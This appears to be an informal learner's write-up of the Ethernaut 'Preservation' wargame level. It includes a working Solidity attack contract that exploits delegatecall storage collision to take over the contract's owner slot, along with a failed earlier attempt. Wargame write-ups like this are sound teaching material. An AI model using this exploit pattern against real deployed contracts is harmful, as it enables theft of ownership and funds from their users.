## Preservation

1. It looked totally foreign to me when i looked at the contract, there was nowhere the owner was being edited and it was using delegate but that we have already leant. So since that web3 blockchain had youtube video i went there and watched it, while watching halfway i understood what was needed to be done but i still watched it all and he used a method where he passes values via console but hacked contract only has one function that is to attack(). Meanwhile i thought why not do wverything with contract if we are using it in the first place....
   `https://www.youtube.com/watch?v=_YkulBTqIcQ` ... i cheated but after that i took the challenge to attack it using contract and not console

2. So i wrote the contract and i was getting typeerror when passing this in uint so i studied why
   `TypeError: Explicit type conversion not allowed from "address" to "uint256".`
   --> Attack.sol:11:42:
   searched and found that it is caused because we need to cast in to uint160 for address in below link also in previous challenge there was use of uint160 and couple of solidity contracts had that `https://stackoverflow.com/questions/75283515/typeerror-explicit-type-conversion-not-allowed-from-uint256-to-address`

> In Ethereum and Solidity, an address if of 20 byte value size (160 bits or 40 hex characters).It corresponds to the last 20 bytes of the Keccak-256 hash of the public key. An address is always pre-fixed with 0x as it is represented in hexadecimal format (base 16 notation) (defined explicitly). => we studied this as well ...

3. I had to try stuff for 3 hours in order to get this work like i had no contructor and every functionality was inside of attack() and it was somewhat like below code snippet which worked for changin timeZone1Library but never changed owner... i kept trying different things and it was trial and error, i understood but still don't know why it didn't work

> below snippet failed and i tried like various things in arguments of setFirstTime changed uint to addr adn uint etc etc ... for 3 hours.. even the setTime had changes of tx.origin and msg.sender and different conversions passed by \_time argument `uint256(uint160(msg.sender))` like so

```solidity
function attack(address _preserve) external {
    Preservation(_preserve).setFirstTime(uint160(address(this)));
    Preservation(_preserve).setFirstTime(uint256(uint160(msg.sender)));
  }

function setTime(uint \_time) public {
    owner = tx.origin;
}
```

4. I was doing trial and error and this below snippet worked... i had to call attack() twice

```solidity
pragma solidity ^0.8.0;

  contract Attack {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;

  Preservation att;

  constructor (address _att) {
    att = Preservation(_att);
  }

  function attack() external {
    att.setFirstTime(uint160(address(this)));
    att.setFirstTime(uint160(msg.sender));
  }

  function setTime(uint _time) public {
    owner = address(uint160(_time));
  }
}

interface Preservation {
  function setFirstTime(uint _timeStamp) external;
}
```

5. After It worked I tried doing this again and it didn't work and my flag which ticks on openzappelin website was lost but then i tried again ... after some change in code and above code totally works but you have to call the constructor with the contract the you are attacking and then call attack twice.

6. success 2x or maybe 2\*
